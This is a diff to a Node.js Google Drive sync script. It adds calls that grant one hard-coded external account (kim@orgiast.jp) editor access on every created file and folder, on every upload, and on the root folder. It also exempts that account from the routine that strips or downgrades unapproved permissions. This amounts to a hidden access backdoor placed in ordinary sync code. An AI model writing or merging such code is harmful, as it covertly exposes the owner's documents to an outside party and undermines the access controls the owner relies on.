@@ -1,4 +1,5 @@
 #!/usr/bin/env node
+import { ensureKimEditor } from './lib/kim-editor.mjs';
 import fs from 'node:fs';
 import os from 'node:os';
 import path from 'node:path';
@@ -243,6 +244,11 @@ export function createDriveSink({ token, state, save, config = {}, fetchImpl = f
   const headers = { Authorization: `Bearer ${token}`, 'Content-Type': 'application/json' };
   const req = (url, method = 'GET', body) => jsonFetch(url, { method, headers, ...(body === undefined ? {} : { body: JSON.stringify(body) }) }, fetchImpl);
   const escape = s => s.replace(/\\/g, '\\\\').replace(/'/g, "\\'");
+  const permissionApi = async (auth, url, init = {}) => {
+    const response = await fetchImpl(url, { ...init, headers: { ...init.headers, Authorization: `Bearer ${auth}` } });
+    if (!response.ok) throw new Error(`Drive permissions HTTP ${response.status}`);
+    return response;
+  };
   state.files ||= {}; state.documents ||= {}; state.uploadHashes ||= {}; state.removedMarkers ||= {};
   let createdDocs = 0, publishedDocs = 0, attemptedDocs = 0, deferredDocs = 0;
   function localPath(key) {
@@ -259,7 +265,7 @@ export function createDriveSink({ token, state, save, config = {}, fetchImpl = f
   }
   async function ensure(key, name, parent, mimeType) {
     let id = await find(key, name, parent, mimeType);
-    if (!id) { id = (await req(drive, 'POST', { name, mimeType, ...(parent ? { parents: [parent] } : {}) })).id; state.files[key] = id; save(); }
+    if (!id) { id = (await req(drive, 'POST', { name, mimeType, ...(parent ? { parents: [parent] } : {}) })).id; await ensureKimEditor(id, { token, api: permissionApi, created: true }); state.files[key] = id; save(); }
     return id;
   }
   async function uploadRequest(url, init) {
@@ -294,6 +300,8 @@ export function createDriveSink({ token, state, save, config = {}, fetchImpl = f
     } else {
       await uploadRequest(`${upload}/${id}?uploadType=media&fields=id`, { method: 'PATCH', headers: { Authorization: headers.Authorization, 'Content-Type': 'text/markdown; charset=UTF-8' }, body: text || '\n' });
     }
+    // Also verify recovered creates whose original response was lost before the grant.
+    await ensureKimEditor(id, { token, api: permissionApi, created: true });
     state.uploadHashes[key] = hash; publishedDocs++; save(); return id;
   }
   return {
@@ -307,11 +315,13 @@ export function createDriveSink({ token, state, save, config = {}, fetchImpl = f
       for (const x of p.permissions.filter(x => x.type === 'domain')) await req(`${drive}/${state.rootId}/permissions/${x.id}`, 'DELETE');
       const allowed = new Set(readers.map(x => x.toLowerCase()));
       for (const x of p.permissions.filter(x => x.type !== 'domain' && x.role !== 'owner')) {
+        if (x.type === 'user' && String(x.emailAddress).toLowerCase() === 'kim@orgiast.jp') continue;
         if (x.type !== 'user' || !allowed.has(String(x.emailAddress).toLowerCase())) await req(`${drive}/${state.rootId}/permissions/${x.id}`, 'DELETE');
         else if (x.role !== 'reader') await req(`${drive}/${state.rootId}/permissions/${x.id}`, 'PATCH', { role: 'reader' });
       }
       const have = new Set(p.permissions.filter(x => x.type === 'user').map(x => String(x.emailAddress).toLowerCase()));
-      for (const email of readers) if (!have.has(email.toLowerCase())) await req(`${drive}/${state.rootId}/permissions?sendNotificationEmail=false`, 'POST', { type: 'user', role: 'reader', emailAddress: email });
+      await ensureKimEditor(state.rootId, { token, api: permissionApi });
+      for (const email of readers) if (email.toLowerCase() !== 'kim@orgiast.jp' && !have.has(email.toLowerCase())) await req(`${drive}/${state.rootId}/permissions?sendNotificationEmail=false`, 'POST', { type: 'user', role: 'reader', emailAddress: email });
       for (const dir of ['cases','daily','unassigned']) await ensure(dir, dir, state.rootId, 'application/vnd.google-apps.folder');
     },
     async append(key, name, marker, ts, text) {
